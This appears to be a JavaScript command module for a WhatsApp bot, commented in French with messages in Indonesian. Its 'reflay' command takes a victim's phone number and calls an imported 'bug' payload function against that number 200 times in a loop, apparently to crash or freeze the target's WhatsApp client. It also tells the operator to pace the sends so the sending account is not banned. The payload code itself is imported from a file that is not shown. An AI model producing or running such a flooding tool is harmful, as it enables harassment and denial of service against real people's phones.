import { bugall } from "../bugall.js"; // ton BugAll.js intact

// Fonction sleep intégrée
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

export default {
  name: "reflay",
  description: "Envoie un bug lourd (Reflay UI)",
  async execute(sock, m, args) {
    const prefix = ".";
    const q = args.join(" ");
    
    if (!q) {
      return await sock.sendMessage(
        m.key.remoteJid,
        { text: `Contoh: ${prefix}reflay 62xxxx` },
        { quoted: m }
      );
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const pureTarget = target.split("@")[0];

    const prosesText = `╔═══════════════════
║  Mengirim bug Reflay UI
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ⏳ Mengirim bug reflay
╚═══════════════════`;

    // Message initial
    await sock.sendMessage(
      m.key.remoteJid,
      { text: prosesText },
      { quoted: m }
    );

    // Boucle de spam Reflay
    for (let i = 0; i < 200; i++) {
      try {
        await bugall.necroxenui(target); // utilise asep = sock dans BugAll.js
      } catch (err) {
        console.error(`Erreur Reflay (#${i + 1}):`, err.message);
      }
      await sleep(500); // pause 1 seconde entre chaque envoi
    }

    const selesaiText = `╔═══════════════════
║  Bug Reflay UI Terminé
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ✅ Berhasil mengirim bug reflay
║ Note: Jeda Agar Sender Tidak Kenon
╚═══════════════════`;

    // Message final
    await sock.sendMessage(
      m.key.remoteJid,
      { text: selesaiText },
      { quoted: m }
    );
  }
};